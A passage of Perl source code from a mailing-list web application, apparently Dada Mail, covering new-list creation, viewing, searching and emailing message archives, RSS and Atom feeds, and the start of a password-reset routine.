            my @t_lists = available_lists(-dbi_handle => $dbi_handle); 
            
            $agree = 'yes' if $errors;

            if((!$t_lists[0]) && ($agree ne 'yes') && (!$process)){
                    print $q->redirect(-uri => "$DADA::Config::S_PROGRAM_URL?agree=no"); 
            }
            
            $DADA::Config::LIST_QUOTA = undef if strip($DADA::Config::LIST_QUOTA) eq '';
            if(($DADA::Config::LIST_QUOTA) && (($#t_lists + 1) >= $DADA::Config::LIST_QUOTA)){ 
                user_error(-List => $list, -Error => "over_list_quota");
                return; 
            }
    
            if(!$t_lists[0]){ 
                $help = 1;
            }
            
            my $ending   = undef; 
            my $err_word = undef;
            
            if($errors){ 
                $ending = '';
                $err_word = 'was';
                $ending = 's'      if $errors > 1; 
                $err_word = 'were' if $errors > 1; 
            }

            require DADA::Template::Widgets;
            
			my @available_lists = DADA::App::Guts::available_lists(); 
			my $lists_exist = $#available_lists + 1;  
			
			my $list_popup_menu = DADA::Template::Widgets::list_popup_menu(
										-show_hidden      => 1,
										-name             => 'clone_settings_from_this_list',
										-empty_list_check => 1,
									); 
									
            
            print list_template(
					-Part       => "header",
	                -Title      => "Create a New List",
					-vars 	    => { show_profile_widget => 0,}
	               );
     
                

            print   DADA::Template::Widgets::screen({-screen => 'new_list_screen.tmpl', 
                                                    -vars   => 
                                                                { 
                                                                errors                            => $errors, 
                                                                ending                            => $ending, 
                                                                err_word                          => $err_word, 
                                                                help                              => $help, 
                                                                root_password                     => $root_password, 
                                                                flags_list_name                   => $flags->{list_name}, 
                                                                list_name                         => $list_name, 
                                                                flags_list_exists                 => $flags->{list_exists}, 
                                                                flags_list                        => $flags->{list}, 
                                                                flags_shortname_too_long          => $flags->{shortname_too_long},
                                                                flags_slashes_in_name             => $flags->{slashes_in_name}, 
                                                                flags_weird_characters            => $flags->{weird_characters}, 
                                                                flags_quotes                      => $flags->{quotes},
                                                                list                              => $list,
                                                                flags_password                    => $flags->{password},
                                                                password                          => $password, 
                                                                
                                                                flags_password_is_root_password   => $flags->{password_is_root_password}, 
                                                                
                                                                flags_retype_password             => $flags->{retype_password}, 
                                                                flags_password_ne_retype_password => $flags->{password_ne_retype_password},            
                                                                retype_password                   => $retype_password, 
                                                                flags_invalid_list_owner_email    => $flags->{invalid_list_owner_email}, 
                                                                list_owner_email                  => $list_owner_email, 
                                                                flags_list_info                   => $flags->{list_info},  
                                                                info                              => $info, 
                                                                flags_privacy_policy              => $flags->{privacy_policy}, 
                                                                privacy_policy                    => $privacy_policy, 
                                                                flags_physical_address            => $flags->{physical_address},
                                                                physical_address                  => $physical_address, 
                                                                flags_list_name_bad_characters    => $flags->{list_name_bad_characters},
                                                                
																lists_exist                       => $lists_exist, 
																list_popup_menu                   => $list_popup_menu, 
                                                                }, 
                                                    });
            
            print list_template(
				  	-Part => "footer"
				   );
    
        }else{
            user_error(
				-List  => $list, 
				-Error => "invalid_root_password"
			);
            return; 
        }
    }else{

        chomp($list); 
        $list =~ s/^\s+//;
        $list =~ s/\s+$//; 
        $list =~ s/ /_/g;

        my $list_exists = check_if_list_exists(-List => $list);
        my ($list_errors,$flags) = check_list_setup(
										-fields => {
											list             => $list, 
                                            list_name        => $list_name, 
                                            list_owner_email => $list_owner_email, 
                                            password         => $password, 
                                            retype_password  => $retype_password, 
                                            info             => $info,
                                            privacy_policy   => $privacy_policy,
                                            physical_address => $physical_address,
                                        }
                               		); 

        if($list_errors >= 1){
            undef($process);
            new_list(
				$list_errors, 
				$flags
			);
        
        }elsif($list_exists >= 1){
            user_error(
				-List  => $list, 
				-Error => "list_already_exists"
			);
            return; 
        }else{
        

            $list_owner_email  = lc_email($list_owner_email);
            $password          = DADA::Security::Password::encrypt_passwd($password); 
            
            my $new_info = {
						#	list             =>   $list, 
                            list_owner_email =>   $list_owner_email,
                            list_name        =>   $list_name,
                            password         =>   $password,
                            info             =>   $info, 
                            privacy_policy   =>   $privacy_policy,
                            physical_address =>   $physical_address, 
                           };
          
            require DADA::MailingList; 
			my $ls; 
			if($q->param('clone_settings') == 1){ 				
            	$ls = DADA::MailingList::Create(
						{
							-list     => $list, 
							-settings => $new_info, 
							-clone    => xss_filter($q->param('clone_settings_from_this_list')), 
						}
					); 
            }
            else { 
            	$ls = DADA::MailingList::Create(
						{
							-list     => $list, 
							-settings => $new_info, 
						}
					);
			}
			
            my $status; 
            
			if($DADA::Config::LOG{list_lives}){ 
	            require DADA::Logging::Usage;
	            my $log = new DADA::Logging::Usage;
	               $log->mj_log(
							$list, 
							'List Created', 
							"remote_host:$ENV{REMOTE_HOST}," . 
							"ip_address:$ENV{REMOTE_ADDR}"
							);     
            }

            my $li = $ls->get; 
            
            my $escaped_list = uriescape($li->{list}); 


            my $auth_state; 
            
            if($DADA::Config::DISABLE_OUTSIDE_LOGINS == 1){ 
                require DADA::Security::SimpleAuthStringState;
                my $sast       =  DADA::Security::SimpleAuthStringState->new;  
                   $auth_state = $sast->make_state;
            }
        
            print list_template(
				-Part  => "header",
                -Title => "Your New List Has Been Created",
				-vars  => { show_profile_widget => 0,}
            );
            
            require DADA::Template::Widgets;
            print DADA::Template::Widgets::screen({-screen => 'new_list_created_screen.tmpl', 
                                                  -vars   => {
                                                              list_name        => $li->{list_name},
                                                              list             => $li->{list}, 
                                                              escaped_list     => $escaped_list, 
                                                              list_owner_email => $li->{list_owner_email}, 
                                                              info             => $li->{info},
                                                              privacy_policy   => $li->{privacy_policy},
                                                              physical_address => $li->{physical_address},
                                                              
                                                              auth_state       => $auth_state,
                                                              
                
                                                          },
                                                 });
            print(list_template(-Part      => "footer", -End_Form   => 0));
            
        }
    }
}




sub archive {

    # are we dealing with a real list?
    my $list_exists = check_if_list_exists(
        -List       => $list,
        -dbi_handle => $dbi_handle
    );

    if ( $list_exists == 0 ) {

        print $q->redirect(
            -status => '301 Moved Permanently',
            -uri    => $DADA::Config::PROGRAM_URL,
        );
        return;
    }

    require DADA::MailingList::Settings;
    my $ls = DADA::MailingList::Settings->new( { -list => $list } );
    my $li = $ls->get;

    require DADA::Profile;
	my $prof = DADA::Profile->new({-from_session => 1}); 
    my $allowed_to_view_archives = $prof->allowed_to_view_archives(
        {
            -list         => $list,
        }
    );
    if ( $allowed_to_view_archives == 0 ) {
        user_error( -List => $list, -Error => "not_allowed_to_view_archives" );
        return;
    }

    my $start = int( $q->param('start') ) || 0;

    require DADA::Template::Widgets;

    if ( $li->{show_archives} == 0 ) {
        user_error( -List => $list, -Error => "no_show_archives" );
        return;
    }

    require DADA::MailingList::Archives;
    $DADA::MailingList::Archives::dbi_obj = $dbi_handle;

    my $archive = DADA::MailingList::Archives->new( { -list => $list } );
    my $entries = $archive->get_archive_entries();

###### These are all little thingies.

    my $archive_send_form = '';
    $archive_send_form = DADA::Template::Widgets::archive_send_form(
        $list, $id,
        xss_filter( $q->param('send_archive_errors') ),
        $li->{captcha_archive_send_form},
        xss_filter( $q->param('captcha_fail') )
      )
      if $li->{archive_send_form} == 1 && defined($id);

    my $nav_table = '';
    $nav_table = $archive->make_nav_table( -Id => $id, -List => $li->{list} )
      if defined($id);

    my $archive_search_form = '';
    $archive_search_form = $archive->make_search_form( $li->{list} )
      if $li->{archive_search_form} == 1;

    my $archive_subscribe_form = "";

    if ( $li->{hide_list} ne "1" ) {
        $li->{info} =~ s/\n\n/<p>/gi;
        $li->{info} =~ s/\n/<br \/>/gi;

        unless ( $li->{archive_subscribe_form} eq "0" ) {
            $archive_subscribe_form .= "<p>" . $li->{info} . "</p>\n";

            $archive_subscribe_form .=
              DADA::Template::Widgets::subscription_form(
                {
                    -list       => $li->{list},
                    -email      => $email,
                    -give_props => 0,
                }
              );
        }
    }

    my $archive_widgets = {
        archive_send_form      => $archive_send_form,
        nav_table              => $nav_table,
        publish_archives_rss   => $li->{publish_archives_rss} ? 1 : 0,
        archive_search_form    => $archive_search_form,
        archive_subscribe_form => $archive_subscribe_form,
    };

    #/##### These are all little thingies.

    if ( !$id ) {

# This is strange, because if there is NO id, there wouldn't be a "send a friend this archive" sorta form!?
        if (   $li->{archive_send_form} != 1
            && $li->{captcha_archive_send_form} != 1 )
        {
            if ( $c->cached( 'archive/' . $list . '/' . $start ) ) {
                $c->show( 'archive/' . $list . '/' . $start );
                return;
            }
        }

        my $th_entries = [];

        my ( $begin, $stop ) = $archive->create_index($start);
        my $i;
        my $stopped_at = $begin;
        my $num        = $begin;

        $num++;
        my @archive_nums;
        my @archive_links;

        # iterate and save
        for ( $i = $begin ; $i <= $stop ; $i++ ) {
            my $link;

            if ( defined( $entries->[$i] ) ) {

                my ( $subject, $message, $format, $raw_msg ) =
                  $archive->get_archive_info( $entries->[$i] );

                # DEV: This is stupid, and I don't think it's a great idea.
                $subject = DADA::Template::Widgets::screen(
                    {
                        -data                     => \$subject,
                        -vars                     => $li,
                        -list_settings_vars       => $li,
                        -list_settings_vars_param => { -dot_it => 1 },
                        -dada_pseudo_tag_filter   => 1,
                        -subscriber_vars_param    =>
                          { -use_fallback_vars => 1, -list => $list },
                    },

                );

                # this is so atrocious.
                my $date = date_this(
                    -Packed_Date   => $archive->_massaged_key( $entries->[$i] ),
                    -Write_Month   => $li->{archive_show_month},
                    -Write_Day     => $li->{archive_show_day},
                    -Write_Year    => $li->{archive_show_year},
                    -Write_H_And_M => $li->{archive_show_hour_and_minute},
                    -Write_Second  => $li->{archive_show_second}
                );

                my $entry = {
                    id               => $entries->[$i],
                    date             => $date,
                    subject          => $subject,
                    'format'         => $format,
                    list             => $list,
                    uri_escaped_list => uriescape($list),
                    PROGRAM_URL      => $DADA::Config::PROGRAM_URL,
                    message_blurb    =>
                      $archive->message_blurb( -key => $entries->[$i] ),

                };

                $stopped_at++;
                push ( @archive_nums,  $num );
                push ( @archive_links, $link );
                $num++;

                push ( @$th_entries, $entry );

            }
        }

        my $ii;
        for ( $ii = 0 ; $ii <= $#archive_links ; $ii++ ) {

            my $bullet = $archive_nums[$ii];

            #fix if we're doing reverse chronologic
            $bullet = ( ( $#{$entries} + 1 ) - ( $archive_nums[$ii] ) + 1 )
              if ( $li->{sort_archives_in_reverse} == 1 );

            # yeah, whatever.
            $th_entries->[$ii]->{bullet} = $bullet;

        }

        my $index_nav = $archive->create_index_nav($stopped_at);

        require DADA::Profile;
		my $prof = DADA::Profile->new(
			{
				-from_session => 1
			}
		); 
        my $allowed_to_view_archives = $prof->allowed_to_view_archives(
            {
                -list         => $list,
            }
        );

        my $scrn = (
            list_template(
                -Part => "header",
                ,
                -Title => $li->{list_name} . " Archives",
                -List  => $li->{list}
            )
        );

        $scrn .= DADA::Template::Widgets::screen(
            {
                -screen => 'archive_index_screen.tmpl',
                -vars   => {
                    list                     => $list,
                    list_name                => $li->{list_name},
                    entries                  => $th_entries,
                    index_nav                => $index_nav,
                    flavor_archive           => 1,
                    allowed_to_view_archives => $allowed_to_view_archives,
                    publish_archives_rss => $li->{publish_archives_rss} ? 1 : 0,

                    %$archive_widgets,

                },
                -list_settings_vars       => $li,
                -list_settings_vars_param => { -dot_it => 1 },

            }
        );
        $scrn .= (
            list_template(
                -Part      => "footer",
                -End_Form  => 0,
                -List      => $li->{list},
                -Site_Name => $li->{website_name},
                -Site_URL  => $li->{website_url}
            )
        );

        e_print($scrn);

        if (   $li->{archive_send_form} != 1
            && $li->{captcha_archive_send_form} != 1 )
        {
            $c->cache( 'archive/' . $list . '/' . $start, \$scrn );
        }
        return;

    }
    else {    # There's an id...

        $id = $archive->newest_entry if $id =~ /newest/i;
        $id = $archive->oldest_entry if $id =~ /oldest/i;

        if ( $q->param('extran') ) {

            print $q->redirect(
                -status => '301 Moved Permanently',
                -uri    => $DADA::Config::PROGRAM_URL
                  . '/archive/'
                  . $li->{list} . '/'
                  . $id . '/',
            );
            return;
        }

        if ( $id !~ m/(\d+)/g ) {

            print $q->redirect( -uri => $DADA::Config::PROGRAM_URL
                  . '/archive/'
                  . $li->{list}
                  . '/' );
            return;
        }

        $id = $archive->_massaged_key($id);

        if (   $li->{archive_send_form} != 1
            && $li->{captcha_archive_send_form} != 1 )
        {

            if ( $c->cached( 'archive/' . $list . '/' . $id ) ) {
                $c->show( 'archive/' . $list . '/' . $id );
                return;
            }
        }

        my $entry_exists = $archive->check_if_entry_exists($id);
        if ( $entry_exists <= 0 ) {
            user_error( -List => $list, -Error => "no_archive_entry" );
            return;
        }

        my ( $subject, $message, $format, $raw_msg ) =
          $archive->get_archive_info($id);

        # DEV: This is stupid, and I don't think it's a great idea.
        $subject = $archive->_parse_in_list_info( -data => $subject );

        # That. Sucked.

        my $scrn = list_template(
            -Part  => "header",
            -Title => $subject,
            -List  => $li->{list},

        );

        my ( $massaged_message_for_display, $content_type ) =
          $archive->massaged_msg_for_display( -key => $id, -body_only => 1 );

        my $show_iframe = $li->{html_archives_in_iframe} || 0;
        if ( $content_type eq 'text/plain' ) {
            $show_iframe = 0;
        }

        my $header_from      = undef;
        my $orig_header_from = undef;

        #my $header_date    = undef;
        my $header_subject = undef;

        my $in_reply_to_id;
        my $in_reply_to_subject;

        if ($raw_msg) {
            $header_from =
              $archive->get_header( -header => 'From', -key => $id );
            $orig_header_from = $header_from;

            # DEV: This logic should not be here...

            if ( $li->{archive_protect_email} eq 'recaptcha_mailhide' ) {
                $header_from = mailhide_encode($header_from);
            }
            elsif ( $li->{archive_protect_email} eq 'spam_me_not' ) {
                $header_from = spam_me_not_encode($header_from);
            }
            else {
                $header_from = xss_filter($header_from);
            }

            $header_subject =
              $archive->get_header( -header => 'Subject', -key => $id );

            $header_subject =~ s/\r|\n/ /g;
            if ( !$header_subject ) {
                $header_subject = $DADA::Config::EMAIL_HEADERS{Subject};
            }

            ( $in_reply_to_id, $in_reply_to_subject ) =
              $archive->in_reply_to_info( -key => $id );

            # DEV: This is stupid, and I don't think it's a great idea.
            $header_subject =
              $archive->_parse_in_list_info( -data => $header_subject );
            $in_reply_to_subject =
              $archive->_parse_in_list_info( -data => $in_reply_to_subject );

            # That. Sucked.
            $header_subject      = strip( xss_filter($header_subject) );
            $in_reply_to_subject = xss_filter($in_reply_to_subject);

        }

        my $attachments =
          ( $li->{display_attachments} == 1 )
          ? $archive->attachment_list($id)
          : [];

        # this is so atrocious.
        my $date = date_this(
            -Packed_Date   => $id,
            -Write_Month   => $li->{archive_show_month},
            -Write_Day     => $li->{archive_show_day},
            -Write_Year    => $li->{archive_show_year},
            -Write_H_And_M => $li->{archive_show_hour_and_minute},
            -Write_Second  => $li->{archive_show_second}
        );

        my $can_use_gravatar_url = 0;
        my $gravatar_img_url     = '';

        if ( $li->{enable_gravatars} ) {

            eval { require Gravatar::URL };
            if ( !$@ ) {
                $can_use_gravatar_url = 1;

                require Email::Address;
                if ( defined($orig_header_from) ) {
                    ;
                    eval {
                        $orig_header_from =
                          ( Email::Address->parse($orig_header_from) )[0]
                          ->address;
                    };
                }
                if ( isa_url( $li->{default_gravatar_url} ) ) {
                    $gravatar_img_url =
                      Gravatar::URL::gravatar_url( email => $orig_header_from );
                }
                else {
                    $gravatar_img_url = Gravatar::URL::gravatar_url(
                        email   => $orig_header_from,
                        default => $li->{default_gravatar_url}
                    );
                }
            }
            else {
                $can_use_gravatar_url = 0;
            }
        }

        $scrn .= DADA::Template::Widgets::screen(
            {
                -screen => 'archive_screen.tmpl',
                -vars   => {
                    list      => $list,
                    list_name => $li->{list_name},
                    id        => $id,

                    # DEV. OK - riddle ME why there's two of these...
                    header_subject => decode_he($header_subject),
                    subject        => decode_he($subject),

                    js_enc_subject      => js_enc($subject),
                    uri_encoded_subject => DADA::App::Guts::uriescape($subject),
                    uri_encoded_url     => DADA::App::Guts::uriescape(
                        $DADA::Config::PROGRAM_URL
                          . '/archive/'
                          . $list . '/'
                          . $id . '/'
                    ),
                    archived_msg_url => $DADA::Config::PROGRAM_NAME
                      . '/archive/'
                      . $list . '/'
                      . $id . '/',
                    massaged_msg_for_display => $massaged_message_for_display,
                    send_archive_success => $q->param('send_archive_success')
                    ? $q->param('send_archive_success')
                    : undef,
                    send_archive_errors => $q->param('send_archive_errors')
                    ? $q->param('send_archive_errors')
                    : undef,
                    show_iframe     => $show_iframe,
                    discussion_list => ( $li->{group_list} == 1 ) ? 1 : 0,

                    #header_from                   => decode_he($header_from),
                    header_from         => $header_from,
                    in_reply_to_id      => $in_reply_to_id,
                    in_reply_to_subject => xss_filter($in_reply_to_subject),
                    attachments         => $attachments,
                    date                => $date,
                    add_social_bookmarking_badges =>
                      $li->{add_social_bookmarking_badges},
                    can_use_gravatar_url => $can_use_gravatar_url,
                    gravatar_img_url     => $gravatar_img_url,
                    %$archive_widgets,

                },
                -list_settings_vars       => $li,
                -list_settings_vars_param => { -dot_it => 1 },
            }
        );
        $scrn .= (
            list_template(
                -Part      => "footer",
                -End_Form  => 0,
                -List      => $li->{list},
                -Site_Name => $li->{website_name},
                -Site_URL  => $li->{website_url},

            )
        );

        e_print($scrn);

        if (   $li->{archive_send_form} != 1
            && $li->{captcha_archive_send_form} != 1 )
        {
            $c->cache( 'archive/' . $list . '/' . $id, \$scrn );

        }

        return;

    }

}





sub archive_bare { 

    
    if($q->param('admin')){ 
            my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                                -Function => 'view_archive');
            $list = $admin_list;
    }
    
    
    if($c->cached('archive_bare.' . $list . '.' . $id . '.' . $q->param('admin'))){ $c->show('archive_bare.' . $list . '.' . $id . '.' . $q->param('admin')); return;}

    require DADA::MailingList::Archives;
           $DADA::MailingList::Archives::dbi_obj = $dbi_handle;
           
    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    my $la = DADA::MailingList::Archives->new({-list => $list}); 
    
    if(!$q->param('admin')){ 
        if ($li->{show_archives} == 0){
            user_error(-List => $list, -Error => "no_show_archives");
            return;
        }
		require DADA::Profile; 
		my $prof = DADA::Profile->new({-from_session => 1}); 
		my $allowed_to_view_archives = $prof->allowed_to_view_archives(
				{
					-list         => $list, 
				}
			);
		if($allowed_to_view_archives == 0){ 
			user_error(-List => $list, -Error => "not_allowed_to_view_archives");
			return;
		}
    }    
    if($la->check_if_entry_exists($id) <= 0) { 
        user_error(-List => $list, -Error => "no_archive_entry");
        return;
    }      
            
    my $scrn = $q->header(); 
       $scrn .= $la->massaged_msg_for_display(-key => $id); 
    e_print($scrn); 
    
    $c->cache('archive_bare.' . $list . '.' . $id . '.' . $q->param('admin'), \$scrn); 
    
    return; 
}




sub search_archive { 
    if (check_if_list_exists(-List => $list, -dbi_handle => $dbi_handle) <= 0) {
        user_error(-List => $list, -Error => "no_list");
        return;
    }
       
    require  DADA::MailingList::Settings; 
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
 
    if ($li->{show_archives} == 0){
        user_error(-List => $list, -Error => "no_show_archives");
        return; 
    } 
	require DADA::Profile; 
	my $prof = DADA::Profile->new({-from_session => 1}); 
	my $allowed_to_view_archives = $prof->allowed_to_view_archives(
			{
				-list         => $list, 
			}
		);
	if($allowed_to_view_archives == 0){ 
		user_error(-List => $list, -Error => "not_allowed_to_view_archives");
		return;
	}  

    $keyword = xss_filter($keyword); 
    
    if($keyword =~ m/^[A-Za-z]+$/){ # just words, basically.
        if($c->cached($list.'.search_archive.' . $keyword)){ $c->show($list.'.search_archive.' . $keyword); return;}
    }


    require DADA::MailingList::Archives;
           $DADA::MailingList::Archives::dbi_obj = $dbi_handle;
    
    my $archive      = DADA::MailingList::Archives->new({-list => $list}); 
    my $entries      = $archive->get_archive_entries(); 
    my $ending       = "";
    my $count        = 0; 
    my $ht_summaries = []; 

    
    my $search_results = $archive->search_entries($keyword); 

    if(defined(@$search_results[0]) && (@$search_results[0] ne "")){

       $count = $#{$search_results}+1; 
       $ending = 's' 
        if defined(@$search_results[1]);
      
        my $summaries = $archive->make_search_summary($keyword, $search_results); 

        foreach(@$search_results){ 
        
            my ($subject, $message, $format) = $archive->get_archive_info($_);    
            my $date = date_this(-Packed_Date   => $_,
                                 -Write_Month   => $li->{archive_show_month},
                                 -Write_Day     => $li->{archive_show_day},
                                 -Write_Year    => $li->{archive_show_year},
                                 -Write_H_And_M => $li->{archive_show_hour_and_minute},
                                 -Write_Second  => $li->{archive_show_second});
                                            
            push(@$ht_summaries, {
                summary     => $summaries->{$_},
                subject     => $archive ->_parse_in_list_info(-data => $subject), 
                date        => $date, 
                id          => $_, 
                PROGRAM_URL => $DADA::Config::PROGRAM_URL, 
                list        => uriescape($list),
            }); 
                 
        }
    }

    my $search_form = ''; 
    if($li->{archive_search_form} == 1){
        $search_form = $archive->make_search_form($li->{list}); 
    }

    my $archive_subscribe_form = ''; 
    if($li->{hide_list} ne "1"){   
       $li->{info} =~ s/\n\n/<p>/gi; 
       $li->{info} =~ s/\n/<br \/>/gi; 
    
        unless ($li->{archive_subscribe_form} eq "0"){ 
            $archive_subscribe_form .= '<p>' . $li->{info} . '</p>' . "\n"; 
            require DADA::Template::Widgets;
 $archive_subscribe_form .= DADA::Template::Widgets::subscription_form({
                -list       => $li->{list}, 
                -email      => $email,
                -give_props => 0, 
            }
             );    
        }
    
    }

    my $scrn; 
    
    $scrn = (list_template(-Part       => "header",
                       -Title      => "Archive Search Results", 
                       -List       => $li->{list},
                       , 
                       ));
                   
                
    require DADA::Template::Widgets;
    $scrn .= DADA::Template::Widgets::screen({-screen => 'search_archive_screen.tmpl', 
                                          -vars => { 
                                                   list_name              => $li->{list_name},
                                                    uriescape_list         => uriescape($list),    
                                                    list                   => $list, 
                                                    count                  => $count, 
                                                    ending                 => $ending, 
                                                    keyword                => $keyword, 
                                                    
                                                    summaries              => $ht_summaries, 
                                                    
                                                    search_results         => $ht_summaries->[0] ? 1 : 0, 
                                                    search_form            => $search_form, 
                                                    archive_subscribe_form => $archive_subscribe_form,                          
                                                    },
											-list_settings_vars_param => {
													-list   => $list, 
													-dot_it => 1, 
											},
                                        }); 
                
    $scrn .= (list_template(-Part      => "footer",
                   -List      => $li->{list},
                   -Site_Name => $li->{website_name},
                   -Site_URL  => $li->{website_url},
                   -End_Form  => 0,
                   ));
    
    e_print($scrn); 
    
    if($keyword =~ m/^[A-Za-z]+$/){ # just words, basically.
        $c->cache($list.'.search_archive.' . $keyword, \$scrn);
    }
    
    return; 
    
     
}





sub send_archive { 

    my $entry        = xss_filter($q->param('entry'));
    my $from_email   = xss_filter($q->param('from_email'));
    my $to_email     = xss_filter($q->param('to_email'));

    my $note         = xss_filter($q->param('note'));
    
    my $errors       = 0;
    
    my $list_exists = check_if_list_exists(-List => $list, -dbi_handle => $dbi_handle);
    
    if ($list_exists <= 0 ) {
        user_error(-List => $list, -Error => "no_list");
        return;
    } 
    
    $errors++ if(check_for_valid_email($to_email)   == 1);
    $errors++ if(check_for_valid_email($from_email) == 1);    
    $errors++ if(check_referer($q->referer()))      != 1; 

    require  DADA::MailingList::Settings; 
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
	require DADA::Profile; 
	my $prof = DADA::Profile->new({-from_session => 1}); 
	my $allowed_to_view_archives = $prof->allowed_to_view_archives(
			{
				-list         => $list, 

			}
		);
	if($allowed_to_view_archives == 0){ 
		user_error(-List => $list, -Error => "not_allowed_to_view_archives");
		return;
	}
	
    # CAPTCHA STUFF

    my $captcha_fail    = 0;
	my $can_use_captcha = 0; 
	eval { require DADA::Security::AuthenCAPTCHA; };
	if(!$@){ 
		$can_use_captcha = 1;        
	}
	
    if($li->{captcha_archive_send_form} == 1 && $can_use_captcha == 1){ 
        require   DADA::Security::AuthenCAPTCHA;
        my $cap = DADA::Security::AuthenCAPTCHA->new;
        
        if(xss_filter($q->param('recaptcha_response_field'))){ 
            my $result = $cap->check_answer(
                $DADA::Config::RECAPTCHA_PARAMS->{private_key}, 
                $DADA::Config::RECAPTCHA_PARAMS->{'remote_address'}, 
                $q->param( 'recaptcha_challenge_field' ), 
                $q->param( 'recaptcha_response_field')
            ); 

            if($result->{is_valid} != 1){ 
                $errors++;
                $captcha_fail = 1;
            }
       } 
        else { 
            # yeah, we're gonna need that...
            $errors++;
            $captcha_fail = 1;
        }
    }

    $errors++ if $li->{archive_send_form}        != 1; 
    
    if($errors > 0){ 
        print $q->redirect(-uri => $DADA::Config::PROGRAM_URL . '?f=archive&l=' . $list . '&id=' . $entry . '&send_archive_errors=' . $errors . '&captcha_fail=' . $captcha_fail);
    }else{
        
        require DADA::MailingList::Archives;
               $DADA::MailingList::Archives::dbi_obj = $dbi_handle;
               
        my $archive = DADA::MailingList::Archives->new({-list => $list}); 
        
        if($entry =~ /newest/i){ 
            $entry = $archive->newest_entry; 
        }
        elsif($entry =~ /oldest/i){
            $entry = $archive->oldest_entry; 
        }
        
        
        my $archive_message_url = $DADA::Config::PROGRAM_URL . '/archive/' . $list . '/' . $entry . '/';
        
        my ($subject, $message, $format, $raw_msg) = $archive->get_archive_info($entry); 
        chomp($subject); 

		require DADA::Template::Widgets; 
        # DEV: This is stupid, and I don't think it's a great idea. 
        $subject = $archive ->_parse_in_list_info(-data => $subject);
		### / 
		
        require MIME::Lite; 
        
        # DEV: This should really be moved to DADA::App::Messages...
        my $msg = MIME::Lite->new(
                    From    => '"[list_settings.list_name]" <' . $from_email . '>', 
                    To      => '"[list_settings.list_name]" <' . $to_email   . '>', 
                    Subject => $li->{send_archive_message_subject}, 
                    Type    => 'multipart/mixed',
                  ); 
                    
           
        my $pt = MIME::Lite->new(Type     => 'text/plain', 
                                 Data     => $li->{send_archive_message}, 
                                 Encoding => $li->{plaintext_encoding});          
           
        my $html = MIME::Lite->new(Type      => 'text/html', 
                                   Data      => $li->{send_archive_message_html}, 
                                   Encoding  => $li->{html_encoding}
                                  ); 
                               
        my $ma = MIME::Lite->new(Type => 'multipart/alternative');
           $ma->attach($pt); 
           $ma->attach($html);          
           
		$msg->attach($ma); 
    
        my $a_msg;
        
		#... sort of weird.
        if($raw_msg){ 
        
            $a_msg = MIME::Lite->new(Type          => 'message/rfc822', 
                                       Disposition => "inline", 
                                       Data        => $archive->massage_msg_for_resending(-key => $entry),
                                      ); 
        
        }else{ 
    
            $a_msg = MIME::Lite->new(Type          => 'message/rfc822', 
                                       Disposition => "inline",
                                       Type        => $format, 
                                       Data        => $message
                                      ); 
        }
        
        $msg->attach($a_msg); 
        
        require DADA::App::FormatMessages; 
        my $fm = DADA::App::FormatMessages->new(-List => $list); 
           $fm->use_list_template(0); 
           $fm->use_email_templates(0); 
           $fm->use_header_info(1); 
 
		   my ($email_str) = $fm->format_message(
									-msg => $msg->as_string
		                          );



		    my $entity = $fm->email_template(
		        {
		            -entity                   => $fm->get_entity({-data => $email_str}),  
		            -list_settings_vars_param => {-list => $list,},
		            -vars                     => {
						from_email               => $from_email, 
						to_email                 => $to_email, 
						note                     => $note, 
						archive_message_url      => $archive_message_url, 
						archived_message_subject => $subject, 
		        	},
		        }
		    );

		    $msg = $entity->as_string; 
		    my ($header_str, $body_str) = split("\n\n", $msg, 2); 

			require DADA::Mail::Send;  
			my $mh = DADA::Mail::Send->new(
						{
							-list   => $list, 
							-ls_obj => $ls, 
						}
					); 

			$mh->send(
			    $mh->return_headers($header_str), 
				Body => $body_str,
		    );
            print $q->redirect(-uri => $DADA::Config::PROGRAM_URL . '?f=archive&l=' . $list . '&id=' . $entry . '&send_archive_success=1');
    }
}




sub archive_rss { 

    my %args = (-type => 'rss', 
                @_
               ); 
               

    my $list_exists = check_if_list_exists(-List => $list, -dbi_handle => $dbi_handle);
    
    if ($list_exists == 0){
    
    }else{ 
    
        require DADA::MailingList::Settings;
               $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

        my $ls = DADA::MailingList::Settings->new({-list => $list}); 
        my $li = $ls->get; 
        
        if ($li->{show_archives} == 0){
    
        }else{ 
    
			require DADA::Profile; 
			my $prof = DADA::Profile->new({-from_session => 1}); 
			my $allowed_to_view_archives = $prof->allowed_to_view_archives(
					{						
						-list         => $list, 
					}
				);
			if($allowed_to_view_archives == 0){ 
				return ''; 
			}
			
            if($li->{publish_archives_rss} == 0){ 
    
            }else{ 
                    
                if($args{-type} eq 'rss'){ 
                    
                    if($c->cached('archive_rss/' . $list)){ $c->show('archive_rss/' . $list); return;}
                    
                    require DADA::MailingList::Archives;
                    $DADA::MailingList::Archives::dbi_obj = $dbi_handle;
                
                    my    $archive = DADA::MailingList::Archives->new({-list => $list});
                    
                    my $scrn = $q->header('application/xml') .  $archive->rss_index();

                    e_print($scrn); 
                    
                    $c->cache('archive_rss/' . $list, \$scrn); 
                    return; 
                    
                    
                }elsif($args{-type} eq 'atom'){ 
                
                    if($c->cached('archive_atom/' . $list)){ $c->show('archive_atom/' . $list); return;}

                    require DADA::MailingList::Archives;
                    $DADA::MailingList::Archives::dbi_obj = $dbi_handle;
                    my    $archive = DADA::MailingList::Archives->new({-list => $list});
                    my $scrn = $q->header('application/xml') . $archive->atom_index(); 
                    e_print($scrn); 
                    
                    $c->cache('archive_atom/' . $list, \$scrn); 
                    return; 
                    
                }else{ 
                    warn "wrong type of feed asked for: " . $args{-type} . ' - '. $!;
                }
            }
     }
    } 
}




sub archive_atom { 

    archive_rss(-type => 'atom'); 

}




sub email_password { 


    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
         
    require DADA::Security::Password;
    
    if(( $li->{pass_auth_id} ne "")    &&  
       ( defined($li->{pass_auth_id})) && 
       ( $q->param('pass_auth_id')  eq $li->{pass_auth_id})){ 
    
        my $new_passwd  = DADA::Security::Password::generate_password(); 
